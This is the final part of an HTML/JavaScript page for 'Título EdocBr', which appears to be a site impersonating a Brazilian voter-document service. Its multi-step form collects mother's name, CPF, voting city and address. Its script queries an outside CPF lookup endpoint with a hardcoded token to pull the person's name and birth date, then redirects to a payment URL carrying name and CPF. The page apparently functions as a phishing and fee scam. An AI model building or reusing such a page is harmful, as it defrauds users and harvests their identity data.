        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .preview-item {
            display: flex;
            justify-content: space-between;
            padding: 0.75rem 0;
            border-bottom: 1px solid #f1f5f9;
            font-size: 0.95rem;
        }
        .preview-label { color: #64748b; font-weight: 500; }
        .preview-value { color: #0f172a; font-weight: 700; text-align: right; }
        .footer {
            background: linear-gradient(135deg, var(--primary-color), var(--dark-color));
            color: white;
            padding: 1.5rem 0.75rem;
            text-align: center;
            width: 100%;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            margin-top: 3rem;
        }
        .footer a {
            color: var(--light-color);
            text-decoration: underline;
            transition: color 0.3s ease;
        }
        .footer a:hover {
            color: white;
        }
        .copyright {
            margin-top: 0.75rem;
            font-size: 0.8rem;
            color: #d1fae5;
        }
        .input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.75rem;
        }
        .input-small {
            width: 100%;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            padding: 1rem;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-small:focus { border-color: var(--primary-color); }
        @media (min-width: 768px) {
            .header {
                padding: 1rem 1.5rem;
            }
            .mobile-menu-btn {
                display: none;
            }
            .nav-menu {
                position: static;
                background: transparent;
                transform: none;
                flex-direction: row;
                justify-content: flex-end;
                padding: 0;
            }
            .nav-menu ul {
                flex-direction: row;
                gap: 1.5rem;
                width: auto;
            }
            .nav-menu ul li a {
                font-size: 0.9rem;
            }
            .container {
                padding-bottom: 4rem;
            }
        }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <header class="header">
            <div class="logo-container">
                <img src="https://cdn-icons-png.flaticon.com/512/197/197386.png" alt="EdocBr Logo" class="logo">
                <span class="brand-name">Título EdocBr</span>
            </div>
            <button class="mobile-menu-btn" id="mobileMenuBtn">
                <i class="fas fa-bars"></i>
            </button>
            <nav class="nav-menu" id="navMenu">
                <ul>
                    <li><a href="/">Voltar ao Início</a></li>
                </ul>
            </nav>
        </header>

        <div class="container">
            <div class="progress-container">
                <div class="progress-mini">
                    <div class="progress-inner" id="progressBar"></div>
                </div>
                <div class="progress-text" id="progressText">Etapa 1 de 7</div>
            </div>

            <div class="card">
                <!-- Step 1: Estado Natal + Cidade de Voto -->
                <div class="step active" id="step1">
                    <label class="label-main">Informações Iniciais</label>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">Estado Natal</label>
                        <input type="text" id="estadoNatal" placeholder="Ex: SP" class="input-large" style="margin-top: 0;">
                    </div>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">Cidade onde vota</label>
                        <input type="text" id="cidadeVotar" placeholder="Ex: São Paulo" class="input-large" style="margin-top: 0;">
                    </div>

                    <button onclick="next(2)" class="btn-next">Próximo <i class="fas fa-chevron-right"></i></button>
                </div>

                <!-- Step 2: Nome da Mãe -->
                <div class="step" id="step2">
                    <label class="label-main">Nome da Mãe</label>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">Digite o nome completo</label>
                        <input type="text" id="nomeMae" placeholder="Nome completo" class="input-large" style="margin-top: 0;">
                    </div>

                    <button onclick="next(3)" class="btn-next">Próximo <i class="fas fa-chevron-right"></i></button>
                    <a href="javascript:void(0)" onclick="back(1)" class="btn-back">Voltar</a>
                </div>

                <!-- Step 3: Aviso Segurança -->
                <div class="step" id="step3">
                    <div class="text-center">
                        <i class="fas fa-shield-halved text-4xl text-emerald-600 mb-4"></i>
                        <label class="label-main block mb-4">Segurança dos seus dados</label>
                        <p class="text-gray-600 text-sm leading-relaxed">
                            Para continuar a análise, precisamos validar seus dados. O CPF é usado exclusivamente para consulta e não é armazenado.
                        </p>
                    </div>
                    <button onclick="next(4)" class="btn-next">Entendi e aceito <i class="fas fa-chevron-right"></i></button>
                    <a href="javascript:void(0)" onclick="back(2)" class="btn-back">Voltar</a>
                </div>

                <!-- Step 4: CPF + Via -->
                <div class="step" id="step4">
                    <label class="label-main">Validação de Documento</label>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">CPF</label>
                        <input type="text" id="cpfInput" placeholder="000.000.000-00" class="input-large" style="margin-top: 0;">
                    </div>

                    <div class="mt-6">
                        <label class="text-sm font-semibold text-gray-700 block mb-3">Qual serviço você precisa?</label>
                        <div class="radio-option" onclick="selectVia('Primeira Via', this)">
                            <i class="fas fa-id-card text-emerald-600"></i> Primeira Via
                        </div>
                        <div class="radio-option" onclick="selectVia('Segunda Via', this)">
                            <i class="fas fa-redo text-emerald-600"></i> Segunda Via / Regularização
                        </div>
                    </div>

                    <button onclick="consultarDados()" class="btn-next">Validar Dados <i class="fas fa-chevron-right"></i></button>
                    <a href="javascript:void(0)" onclick="back(3)" class="btn-back">Voltar</a>
                </div>

                <!-- Step 5: Dados Identificados -->
                <div class="step" id="step5">
                    <div class="text-center" id="loadingBox">
                        <div class="spinner"></div>
                        <p class="font-bold text-emerald-800">Validando seus dados...</p>
                    </div>
                    <div id="dadosValidados" style="display:none;">
                        <label class="label-main">Dados Identificados</label>
                        <div class="preview-box mt-4">
                            <div class="preview-item"><span class="preview-label">Nome:</span> <span class="preview-value" id="resNome"></span></div>
                            <div class="preview-item"><span class="preview-label">Nascimento:</span> <span class="preview-value" id="resNasc"></span></div>
                        </div>
                        <button onclick="next(6)" class="btn-next">Confirmar e Seguir <i class="fas fa-chevron-right"></i></button>
                    </div>
                </div>

                <!-- Step 6: CEP + Número -->
                <div class="step" id="step6">
                    <label class="label-main">Endereço Atual</label>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">CEP</label>
                        <input type="text" id="cepInput" placeholder="00000-000" class="input-large" style="margin-top: 0;">
                        <div id="enderecoAuto" class="mt-2 text-sm text-gray-600 font-medium"></div>
                    </div>

                    <div class="mt-4">
                        <label class="text-sm font-semibold text-gray-700 block mb-2">Número da residência</label>
                        <input type="text" id="numeroInput" placeholder="Ex: 123" class="input-large" style="margin-top: 0;">
                    </div>

                    <button onclick="next(7)" class="btn-next">Próximo <i class="fas fa-chevron-right"></i></button>
                    <a href="javascript:void(0)" onclick="back(4)" class="btn-back">Voltar</a>
                </div>

                <!-- Step 7: Validação e Checkout -->
                <div class="step" id="step7">
                    <label class="label-main">Validação Geral</label>
                    <div class="mt-4">
                        <p class="text-xs font-bold text-emerald-700 uppercase mb-2">Dados Pessoais</p>
                        <div class="preview-item"><span class="preview-label">Nome:</span> <span class="preview-value" id="finalNome"></span></div>
                        <div class="preview-item"><span class="preview-label">Nascimento:</span> <span class="preview-value" id="finalNasc"></span></div>
                        <div class="preview-item"><span class="preview-label">Mãe:</span> <span class="preview-value" id="finalMae"></span></div>

                        <p class="text-xs font-bold text-emerald-700 uppercase mt-4 mb-2">Local de Votação</p>
                        <div class="preview-item"><span class="preview-label">Estado:</span> <span class="preview-value" id="finalEstado"></span></div>
                        <div class="preview-item"><span class="preview-label">Cidade Voto:</span> <span class="preview-value" id="finalCidadeVoto"></span></div>

                        <p class="text-xs font-bold text-emerald-700 uppercase mt-4 mb-2">Endereço</p>
                        <div class="preview-item"><span class="preview-label">CEP:</span> <span class="preview-value" id="finalCep"></span></div>
                        <div class="preview-item"><span class="preview-label">Logradouro:</span> <span class="preview-value" id="finalLogra"></span></div>
                        <div class="preview-item"><span class="preview-label">Número:</span> <span class="preview-value" id="finalNum"></span></div>
                    </div>
                    <button onclick="finalizar()" class="btn-next">Solicitar Edoc<i class="fas fa-check-circle"></i></button>
                    <a href="javascript:void(0)" onclick="back(6)" class="btn-back">Voltar</a>
                </div>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="copyright">
            <p>EdocBr © 2025 - Todos os direitos reservados</p>
            <p class="mt-1">
                <a href="/termos">Termos de Uso</a> | 
                <a href="/privacidade">Política de Privacidade</a>
            </p>
        </div>
    </footer>

    <script>
        let currentStep = 1;
        const totalSteps = 7;
        let formData = { via: '' };
        let enderecoData = {};

        // Mobile Menu Toggle
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navMenu = document.getElementById('navMenu');

        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            mobileMenuBtn.innerHTML = navMenu.classList.contains('active') 
                ? '<i class="fas fa-times"></i>' 
                : '<i class="fas fa-bars"></i>';
        });

        function updateProgress() {
            const percent = (currentStep / totalSteps) * 100;
            $('#progressBar').css('width', percent + '%');
            $('#progressText').text(`Etapa ${currentStep} de ${totalSteps} • ${Math.round(percent)}%`);
        }

        function next(step) {
            // Validações
            if(currentStep === 1) {
                if(!$('#estadoNatal').val() || !$('#cidadeVotar').val()) {
                    alert('Por favor, preencha todos os campos');
                    return;
                }
            }
            if(currentStep === 2 && !$('#nomeMae').val()) {
                alert('Por favor, informe o nome da mãe');
                return;
            }
            if(currentStep === 4) {
                if($('#cpfInput').val().length < 14) {
                    alert('Por favor, informe um CPF válido');
                    return;
                }
                if(!formData.via) {
                    alert('Por favor, selecione o tipo de serviço');
                    return;
                }
            }
            if(currentStep === 6) {
                if($('#cepInput').val().length < 9) {
                    alert('Por favor, informe um CEP válido');
                    return;
                }
                if(!$('#numeroInput').val()) {
                    alert('Por favor, informe o número da residência');
                    return;
                }
            }

            $('.step').removeClass('active');
            $(`#step${step}`).addClass('active');
            currentStep = step;
            updateProgress();

            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function back(step) {
            $('.step').removeClass('active');
            $(`#step${step}`).addClass('active');
            currentStep = step;
            updateProgress();

            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function selectVia(via, el) {
            formData.via = via;
            $('.radio-option').removeClass('selected');
            $(el).addClass('selected');
        }

        async function consultarDados() {
            if(!formData.via) {
                alert('Por favor, selecione o tipo de serviço');
                return;
            }

            const cpf = $('#cpfInput').val().replace(/\D/g, '');

            next(5);

            try {
                const response = await fetch(`https://searchapi.dnnl.live/consulta?cpf=${cpf}&token_api=5621`, {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) {
                    throw new Error('Erro ao consultar CPF');
                }

                const apiData = await response.json();
                console.log('Resposta da API:', apiData);

                const dadosApi = apiData.dados && apiData.dados[0];

                if (!dadosApi || !dadosApi.NOME || !dadosApi.NASC) {
                    alert('Dados não encontrados para este CPF');
                    back(4);
                    return;
                }

                setTimeout(() => {
                    $('#loadingBox').hide();
                    $('#dadosValidados').fadeIn();
                    formData.nome = dadosApi.NOME;
                    formData.nasc = dadosApi.NASC;
                    formData.cpf = cpf;
                    $('#resNome').text(formData.nome);
                    $('#resNasc').text(formData.nasc);
                }, 1500);

            } catch (error) {
                console.error('Erro:', error);
                alert('Erro ao consultar dados. Tente novamente.');
                back(4);
            }
        }

        // Máscaras
        $('#cpfInput').on('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 11) v = v.slice(0, 11);
            v = v.replace(/^(\d{3})(\d)/, '$1.$2').replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3').replace(/\.(\d{3})(\d)/, '.$1-$2');
            e.target.value = v;
        });

        $('#cepInput').on('input', async e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 8) v = v.slice(0, 8);
            v = v.replace(/^(\d{5})(\d)/, '$1-$2');
            e.target.value = v;

            if(v.length === 9) {
                $('#enderecoAuto').html('<i class="fas fa-spinner fa-spin"></i> Buscando endereço...');

                try {
                    const res = await fetch(`https://brasilapi.com.br/api/cep/v1/${v.replace('-','')}`);
                    const data = await res.json();

                    if(data.street) {
                        enderecoData = {
                            street: data.street,
                            neighborhood: data.neighborhood,
                            city: data.city,
                            state: data.state,
                            logradouro: data.street,
                            bairro: data.neighborhood,
                            localidade: data.city,
                            uf: data.state
                        };
                        $('#enderecoAuto').html(`<span style="color: var(--primary-color);">✓ ${data.street}, ${data.neighborhood}</span>`);
                    }
                } catch(err) {
                    try {
                        const res2 = await fetch(`https://viacep.com.br/ws/${v.replace('-','')}/json/`);
                        const data2 = await res2.json();

                        if(!data2.erro) {
                            enderecoData = {
                                street: data2.logradouro,
                                neighborhood: data2.bairro,
                                city: data2.localidade,
                                state: data2.uf,
                                logradouro: data2.logradouro,
                                bairro: data2.bairro,
                                localidade: data2.localidade,
                                uf: data2.uf
                            };
                            $('#enderecoAuto').html(`<span style="color: var(--primary-color);">✓ ${data2.logradouro}, ${data2.bairro}</span>`);
                        } else {
                            $('#enderecoAuto').html('<span style="color: #dc2626;">CEP não encontrado</span>');
                        }
                    } catch(err2) {
                        console.error('Erro ao buscar CEP:', err2);
                        $('#enderecoAuto').html('<span style="color: #dc2626;">Erro ao buscar CEP</span>');
                    }
                }
            } else {
                $('#enderecoAuto').html('');
                enderecoData = {};
            }
        });

        function preencherFinal() {
            $('#finalNome').text(formData.nome);
            $('#finalNasc').text(formData.nasc);
            $('#finalMae').text($('#nomeMae').val().toUpperCase());
            $('#finalEstado').text($('#estadoNatal').val().toUpperCase());
            $('#finalCidadeVoto').text($('#cidadeVotar').val().toUpperCase());
            $('#finalCep').text($('#cepInput').val());
            $('#finalLogra').text(enderecoData.street || enderecoData.logradouro || 'N/A');
            $('#finalNum').text($('#numeroInput').val());
        }

        // Sobrescrever next para o step 7
        const originalNext = next;
        next = function(step) {
            if(step === 7) preencherFinal();
            originalNext(step);
        }

        function finalizar() {
            const url = `https://pay.docfacil.digital/v7R0glkabeVGVr9?nome=${encodeURIComponent(formData.nome)}&cpf=${formData.cpf}`;
            window.location.href = url;
        }

        updateProgress();
    </script>
</body>
</html>				</div>
					</div>
				</div>
